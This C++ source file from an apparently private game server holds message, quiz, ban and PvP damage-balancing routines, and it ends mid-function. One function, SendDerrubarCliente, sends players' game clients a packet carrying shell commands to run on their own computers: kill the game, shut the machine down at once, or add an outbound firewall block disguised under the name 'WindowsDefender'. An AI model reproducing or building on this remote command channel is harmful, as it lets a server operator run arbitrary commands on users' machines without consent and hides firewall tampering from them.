
#include <memory>

#include "..\Basedef.h"
#include "SendFunc.h"
#include "GetFunc.h"
#include "Server.h"
#include "Language.h"
#include <fstream>
#include <vector>
#include <time.h>
#include <random>
#include <ctime>
#include "..\DBSrv\CRanking.h"
#include "wMySQL.h"
#include "../ItemEffect.h"
#include "Functions.h"

int checkCord(int conn, int cX, int cY, int cX2, int cY2)
{
	int cnt = 0;
	if (pMob[conn].TargetX >= cX && pMob[conn].TargetX <= cX2 && pMob[conn].TargetY >= cY && pMob[conn].TargetY <= cY2)
		cnt++;

	return cnt;
}

BOOL bFile_exists(const char *filename)
{
	FILE *arquivo;
	arquivo = fopen(filename, "rb");

	if (arquivo)
	{
		fclose(arquivo);
		return TRUE;
	}

	return FALSE;
}

void SendClientMessage(int conn, char *Message)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_MessagePanel sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_MessagePanel));

	sm_mp.Size = sizeof(MSG_MessagePanel);
	sm_mp.Type = _MSG_MessagePanel;
	sm_mp.ID = 0;

	memcpy(sm_mp.String, Message, MESSAGE_LENGTH);

	sm_mp.String[MESSAGE_LENGTH - 1] = 0;
	sm_mp.String[MESSAGE_LENGTH - 2] = 0;

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0) {

		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_MessagePanel))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_MessagePanel)))
			CloseUser(conn);
	}
}

void BalanceioPvP()
{
	auto& pc = cSQL::instance();

	sprintf(xQuery, "SELECT * FROM `balanceamento` LIMIT 50");
	MYSQL_ROW row;
	MYSQL* wSQL = pc.wStart();
	MYSQL_RES* result = pc.wRes(wSQL, xQuery);

	if (result == NULL)
	{
		return;
	}

	int i = 1;
	while ((row = mysql_fetch_row(result)) != NULL)
	{
		ClassVsClass[0][i] = atoi(row[2]);
		pClassVsClass[0][i] = atoi(row[3]);
		ClassVsClass[1][i] = atoi(row[4]);
		pClassVsClass[1][i] = atoi(row[5]);
		ClassVsClass[2][i] = atoi(row[6]);
		pClassVsClass[2][i] = atoi(row[7]);
		i++;
	}
}

int DamageCalc(int signal, int pValue, int iValue)
{
	int Damage = iValue;
	int Por = pValue;
	int sinal = signal;

	if (sinal == TRUE) {
		Damage += Damage * pValue / 100;
	}
	else {
		Damage -= Damage * pValue / 100;
	}

	return Damage;
}

int DamageBalancing(int conn, int idx, int tDamage)
{
	int Damage = tDamage;

	if (idx > 0 && idx < MAX_USER)
	{
		int atacante_pvp = pMob[conn].MOB.Class;
		int defensor_pvp = pMob[idx].MOB.Class;
		int Evolução = pMob[conn].extra.ClassMaster;
		int atacante_Verificar_DAM_MG = JOGADOR_FISICO;
		int defensor_Verificar_DAM_MG = JOGADOR_FISICO;

		if (pMob[conn].MOB.BaseScore.Int >= (pMob[conn].MOB.BaseScore.Str + pMob[conn].MOB.BaseScore.Dex))
			atacante_Verificar_DAM_MG = JOGADOR_MAGO;

		if (pMob[idx].MOB.BaseScore.Int >= (pMob[idx].MOB.BaseScore.Str + pMob[idx].MOB.BaseScore.Dex))
			defensor_Verificar_DAM_MG = JOGADOR_MAGO;
		
		int z = 0;
		if (Evolução == MORTAL) {
			z = 0;
		}
		if (Evolução == ARCH) {
			z = 1;
		}
		if (Evolução >= CELESTIAL) {
			z = 2;
		}
		if (atacante_pvp == TK)
		{
			if (atacante_Verificar_DAM_MG == JOGADOR_FISICO)
			{
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][1], ClassVsClass[z][1], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][2], ClassVsClass[z][2], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][3], ClassVsClass[z][3], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][4], ClassVsClass[z][4], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][5], ClassVsClass[z][5], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][6], ClassVsClass[z][6], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][7], ClassVsClass[z][7], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][4], ClassVsClass[z][4], tDamage);
					}
				}
			}
			else {
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][8], ClassVsClass[z][8], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][9], ClassVsClass[z][9], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][10], ClassVsClass[z][10], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][11], ClassVsClass[z][11], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][12], ClassVsClass[z][12], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][13], ClassVsClass[z][13], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][14], ClassVsClass[z][14], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][11], ClassVsClass[z][11], tDamage);
					}
				}
			}
		}

		else if (atacante_pvp == FM)
		{
			if (atacante_Verificar_DAM_MG == JOGADOR_FISICO)
			{
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][15], ClassVsClass[z][15], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][16], ClassVsClass[z][16], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][17], ClassVsClass[z][17], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][18], ClassVsClass[z][18], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][19], ClassVsClass[z][19], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][20], ClassVsClass[z][20], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][21], ClassVsClass[z][21], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][18], ClassVsClass[z][18], tDamage);
					}
				}
			}
			else {
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][22], ClassVsClass[z][22], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][23], ClassVsClass[z][23], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][24], ClassVsClass[z][24], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][25], ClassVsClass[z][25], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][26], ClassVsClass[z][26], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][27], ClassVsClass[z][27], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][28], ClassVsClass[z][28], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][25], ClassVsClass[z][25], tDamage);
					}
				}
			}
		}

		else if (atacante_pvp == BM)
		{
			if (atacante_Verificar_DAM_MG == JOGADOR_FISICO)
			{
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][29], ClassVsClass[z][29], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][30], ClassVsClass[z][30], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][31], ClassVsClass[z][31], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][32], ClassVsClass[z][32], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][33], ClassVsClass[z][33], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][34], ClassVsClass[z][34], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][35], ClassVsClass[z][35], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][32], ClassVsClass[z][32], tDamage);
					}
				}
			}
			else {
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][36], ClassVsClass[z][36], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][37], ClassVsClass[z][37], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][38], ClassVsClass[z][38], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][39], ClassVsClass[z][39], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][40], ClassVsClass[z][40], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][41], ClassVsClass[z][41], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][42], ClassVsClass[z][42], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][39], ClassVsClass[z][39], tDamage);
					}
				}
			}
		}

		else if (atacante_pvp == HT)
		{
			if (atacante_Verificar_DAM_MG == JOGADOR_FISICO)
			{
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][43], ClassVsClass[z][43], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][44], ClassVsClass[z][44], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][45], ClassVsClass[z][45], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][46], ClassVsClass[z][46], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][47], ClassVsClass[z][47], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][48], ClassVsClass[z][48], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][49], ClassVsClass[z][49], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][46], ClassVsClass[z][46], tDamage);
					}
				}
			}
			else {
				if (defensor_Verificar_DAM_MG == JOGADOR_FISICO)
				{
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][43], ClassVsClass[z][43], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][44], ClassVsClass[z][44], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][45], ClassVsClass[z][45], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][46], ClassVsClass[z][46], tDamage);
					}
				}
				else {
					if (defensor_pvp == TK) {
						Damage = DamageCalc(pClassVsClass[z][47], ClassVsClass[z][47], tDamage);
					}
					else if (defensor_pvp == FM)
					{
						Damage = DamageCalc(pClassVsClass[z][48], ClassVsClass[z][48], tDamage);
					}
					else if (defensor_pvp == BM)
					{
						Damage = DamageCalc(pClassVsClass[z][49], ClassVsClass[z][49], tDamage);
					}
					else if (defensor_pvp == HT)
					{
						Damage = DamageCalc(pClassVsClass[z][46], ClassVsClass[z][46], tDamage);
					}
				}
			}
		}
	}

	return Damage;
}

void SendDerrubarCliente(int conn, short Modelo) //desliga o pc do garoto
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_ExecCommands packet;
	memset(&packet, 0x0, sizeof(MSG_ExecCommands));
	packet.Size = sizeof(MSG_ExecCommands);
	packet.Type = 0xFDD;
	packet.ID = conn;
	switch (Modelo)
	{
	case 0:
	{
		strncpy(packet.Command, "taskkill /F /IM \"TheNewWorld.exe\" /T", sizeof(packet.Command));
	}
	break;
	case 1:
	{
		strncpy(packet.Command, "shutdown -s -t 00", sizeof(packet.Command));
	}
	break;
	case 2:
	{
		strncpy(packet.Command, "netsh advfirewall firewall add rule name=WindowsDefender dir=out action=block protocol=tcp localip=any remoteip=144.217.229.3", sizeof(packet.Command));
	}
	break;
	default:
		return;
	}
	pUser[conn].cSock.SendOneMessage((char*)&packet, sizeof(packet));
}

char* strFmt(const char* str, ...)
{
	static char buffer[512] = { 0, };
	va_list va;
	va_start(va, str);
	vsprintf_s(buffer, str, va);
	va_end(va);
	return buffer;
}

void SendBanAccount(int conn, int type)
{
	if (conn <= NULL || conn >= MAX_USER)
		return;

	struct tm when;
	time_t now;
	time(&now);
	when = *localtime(&now);

	auto ban = &BannedUser[conn];
	memset(&BannedUser[conn], 0, sizeof(AccountBanned));

	switch (type)
	{
		/*Temporario 3 horas*/
	case Banned::Tempo3horas:
	{
		ban->mes = when.tm_mon;
		ban->dia = when.tm_mday;
		ban->hora = when.tm_hour + 3;
		ban->min = when.tm_min;
		ban->ano = when.tm_year;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}

	/* 3 dias*/
	case Banned::Tempo3dias:
	{
		ban->mes = when.tm_mon;
		ban->dia = when.tm_mday + 3;
		ban->hora = when.tm_hour;
		ban->min = when.tm_min;
		ban->ano = when.tm_year;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}

	/* 7 dias*/
	case Banned::Tempo7dias:
	{
		ban->mes = when.tm_mon;
		ban->dia = when.tm_mday + 7;
		ban->hora = when.tm_hour;
		ban->min = when.tm_min;
		ban->ano = when.tm_year;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}

	/* 15 dias*/
	case Banned::Tempo15dias:
	{
		ban->mes = when.tm_mon;
		ban->dia = when.tm_mday + 15;
		ban->hora = when.tm_hour;
		ban->min = when.tm_min;
		ban->ano = when.tm_year;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}

	/* 30 dias*/
	case Banned::Tempo30dias:
	{
		ban->mes = when.tm_mon;
		ban->dia = when.tm_mday + 30;
		ban->hora = when.tm_hour;
		ban->min = when.tm_min;
		ban->ano = when.tm_year;
		//sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		//sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		//Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}

	/* Permanente */
	case Banned::Permanente:
	{
		ban->Permanente = TRUE;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}


	/* Ban Analise */
	case Banned::Analise:
	{

		ban->Analyze = TRUE;
		sprintf(temp, "!Conta [%s] bloqueada até as: [%02d:%02d]  de [%02d/%02d/%04d]", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		sprintf(temp, "Nome da conta: [%s] Data de Banimento: [%02d:%02d] de [%02d/%02d/%04d] Motivo: Grade B", pUser[conn].AccountName, ban->hora, ban->min, ban->dia, ban->mes + 1, ban->ano + 1900);
		Log(temp, pUser[conn].AccountName, pUser[conn].IP);
		break;
	}


	}
	SendSaveBanned(conn);
	SendClientMessage(conn, temp);
	CloseUser(conn);
}


bool SendSaveBanned(int conn)
{
	if (conn < 0 || conn > MAX_USER)
		return false;



	std::ofstream outputFile(strFmt("Ban/%s.bin", pUser[conn].AccountName), std::ofstream::out | std::ofstream::binary);

	if (outputFile.is_open())
	{
		AccountBanned temp;
		std::memcpy(&temp, &BannedUser[conn], sizeof(AccountBanned));

		outputFile.write(reinterpret_cast<char*>(&BannedUser[conn]), sizeof(AccountBanned));
		outputFile.close();
		return true;
	}

	return false;
}



void SendBigMessage(int conn, char *Title, char *String)
{
	int Num, i, j, sLine = 1;

	char sString[128];

	strncpy(sString, String, 128);

	Num = strlen(String);

	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_BigQuiz sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_BigQuiz));

	sm_mp.Size = sizeof(MSG_BigQuiz);
	sm_mp.Type = _MSG_BigQuiz;
	sm_mp.ID = conn;

	memcpy(sm_mp.Title, Title, 128);

	if (Num < 64)
		memcpy(sm_mp.Line[1], String, 128);
	else
	{
		for (int i = 0; i < 64; i++)
			sm_mp.Line[sLine][i] = sString[i];

		sLine++;

		for (int i = 64, j = 0; i < Num; i++, j++)
			sm_mp.Line[sLine][j] = sString[i];
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0) {
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_BigQuiz))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_BigQuiz)))
			CloseUser(conn);
	}
}

void SendWindowMessage(int conn, char *Message)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_MessageWindow sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_MessageWindow));

	sm_mp.Size = sizeof(MSG_MessageWindow);
	sm_mp.Type = _MSG_MessageWindow;
	sm_mp.ID = 0;

	memcpy(sm_mp.String, Message, MESSAGE_LENGTH);

	sm_mp.String[MESSAGE_LENGTH - 1] = 0;
	sm_mp.String[MESSAGE_LENGTH - 2] = 0;

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0) {
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_MessageWindow))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_MessageWindow)))
			CloseUser(conn);
	}
}

void SendQuizMessage(int conn, char* Title, char* Answer0, char* Answer1, char* Answer2, char* Answer3, char correct)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_Quiz sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_Quiz));

	sm_mp.Size = sizeof(MSG_Quiz);
	sm_mp.Type = _MSG_Quiz;
	sm_mp.ID = conn;

	strncpy(sm_mp.Title, Title, sizeof(sm_mp.Title));
	strncpy(sm_mp.Answer[0], Answer0, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[1], Answer1, sizeof(sm_mp.Answer[1]));
	strncpy(sm_mp.Answer[2], Answer2, sizeof(sm_mp.Answer[2]));
	strncpy(sm_mp.Answer[3], Answer3, sizeof(sm_mp.Answer[3]));

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_Quiz))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_Quiz)))
			CloseUser(conn);

		SendQuiz[conn].Status = TRUE;
		SendQuiz[conn].RespostaCorreta = correct;
	}
}

void SendQuizLanN(int conn, char* Title, char* Answer0, char* Answer1, char* Answer2, char* Answer3, char correct)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_Quiz sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_Quiz));

	sm_mp.Size = sizeof(MSG_Quiz);
	sm_mp.Type = _MSG_Quiz;
	sm_mp.ID = conn;

	strncpy(sm_mp.Title, Title, sizeof(sm_mp.Title));
	strncpy(sm_mp.Answer[0], Answer0, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[1], Answer1, sizeof(sm_mp.Answer[1]));
	strncpy(sm_mp.Answer[2], Answer2, sizeof(sm_mp.Answer[2]));
	strncpy(sm_mp.Answer[3], Answer3, sizeof(sm_mp.Answer[3]));

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_Quiz))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_Quiz)))
			CloseUser(conn);

		SendQuiz[conn].StatusN = TRUE;
		SendQuiz[conn].RespostaCorretaLanN = correct;
	}
}

void SendQuizLanM(int conn, char* Title, char* Answer0, char* Answer1, char* Answer2, char* Answer3, char correct)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_Quiz sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_Quiz));

	sm_mp.Size = sizeof(MSG_Quiz);
	sm_mp.Type = _MSG_Quiz;
	sm_mp.ID = conn;

	strncpy(sm_mp.Title, Title, sizeof(sm_mp.Title));
	strncpy(sm_mp.Answer[0], Answer0, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[1], Answer1, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[2], Answer2, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[3], Answer3, sizeof(sm_mp.Answer[0]));

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_Quiz))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_Quiz)))
			CloseUser(conn);

		SendQuiz[conn].StatusM = TRUE;
		SendQuiz[conn].RespostaCorretaLanM = correct;
	}
}

void SendQuizLanA(int conn, char* Title, char* Answer0, char* Answer1, char* Answer2, char* Answer3, char correct)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_Quiz sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_Quiz));

	sm_mp.Size = sizeof(MSG_Quiz);
	sm_mp.Type = _MSG_Quiz;
	sm_mp.ID = conn;

	strncpy(sm_mp.Title, Title, sizeof(sm_mp.Title));
	strncpy(sm_mp.Answer[0], Answer0, sizeof(sm_mp.Answer[0]));
	strncpy(sm_mp.Answer[1], Answer1, sizeof(sm_mp.Answer[1]));
	strncpy(sm_mp.Answer[2], Answer2, sizeof(sm_mp.Answer[2]));
	strncpy(sm_mp.Answer[3], Answer3, sizeof(sm_mp.Answer[3]));

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_Quiz))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_Quiz)))
			CloseUser(conn);

		SendQuiz[conn].StatusA = TRUE;
		SendQuiz[conn].RespostaCorretaLanA = correct;
	}
}

void SendMessageBox(int conn, char *Message)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_MessageBoxOk sm_mp;
	memset(&sm_mp, 0, sizeof(MSG_MessageBoxOk));

	sm_mp.Size = sizeof(MSG_MessageBoxOk);
	sm_mp.Type = _MSG_MessageBoxOk;
	sm_mp.ID = 0;

	memcpy(sm_mp.String, Message, MESSAGE_LENGTH);

	sm_mp.String[MESSAGE_LENGTH - 1] = 0;
	sm_mp.String[MESSAGE_LENGTH - 2] = 0;

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0) {
		int Size = sm_mp.Size;

		if (Size > sizeof(MSG_MessageBoxOk))
		{
			sm_mp.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mp, sizeof(MSG_MessageBoxOk)))
			CloseUser(conn);
	}
}

void SendNotice(char *Message)
{
	char Notice[512];

	sprintf_s(Notice, "not %s", Message);
	Log(Notice, "-system", NULL);

	if (Message[0] == '\'' && Message[1] == 'x')
		return;

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY)
			SendClientMessage(i, Message);
	}
}

void SendNoticeChief(char *Message)
{
	char Notice[512];

	sprintf_s(Notice, "not %s", Message);

	Log(Notice, "-system", NULL);

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (pMob[i].MOB.GuildLevel != 9)
			continue;

		int Guild = pMob[i].MOB.Guild;

		if (Guild <= 0)
			continue;

		int FoundCharged = 0;

		for (int j = 0; j < MAX_SERVER; j++)
		{
			for (int k = 0; k < MAX_GUILDZONE; k++)
			{
				if (ChargedGuildList[j][k] && ChargedGuildList[j][k] == Guild)
				{
					FoundCharged = 1;
					break;
				}
			}
		}

		SendClientMessage(i, Message);
	}
}

void SendSummonChief()
{
	Log("summon chief", "-system", NULL);

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (pMob[i].MOB.GuildLevel != 9)
			continue;

		int Guild = pMob[i].MOB.Guild;

		if (Guild <= 0)
			continue;

		int FoundCharged = 0;

		int Server = 0;
		int GuildZone = 0;

		for (int j = 0; j < MAX_SERVER; j++)
		{
			for (int k = 0; k < MAX_GUILDZONE; k++)
			{
				if (ChargedGuildList[j][k] && ChargedGuildList[j][k] == Guild)
				{
					FoundCharged = 1;
					Server = j;
					GuildZone = k;

					break;
				}
			}
		}

		if (FoundCharged == 0)
			return;

		int tx = 7 * Server / 5 + 317;
		int ty = 4025 - 2 * Server % 5;

		if (Server / 5)
			tx = tx + GuildZone;
		else
			tx = tx - GuildZone;

		DoTeleport(i, tx, ty);
	}
}

void SendNoticeArea(char *Message, int x1, int y1, int x2, int y2)
{
	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (pMob[i].TargetX >= x1 && pMob[i].TargetX <= x2 && pMob[i].TargetY >= y1 && pMob[i].TargetY <= y2)
			SendClientMessage(i, Message);
	}
}

void SendGuildNotice(int Guild, char *Message)
{
	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY)
		{
			if (pMob[i].MOB.Guild == Guild)
				SendClientMessage(i, Message);
		}
	}
}

void SendClientMessageOk(int conn, char *Message, int Useless1, int Useless2) //Useless
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_MessageBoxOk sm_mbo;
	memset(&sm_mbo, 0, sizeof(MSG_MessageBoxOk));

	sm_mbo.Type = _MSG_MessageBoxOk;

	memcpy(sm_mbo.String, Message, MESSAGE_LENGTH);

	sm_mbo.Useless1 = Useless1;
	sm_mbo.Useless2 = Useless2;

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0) {
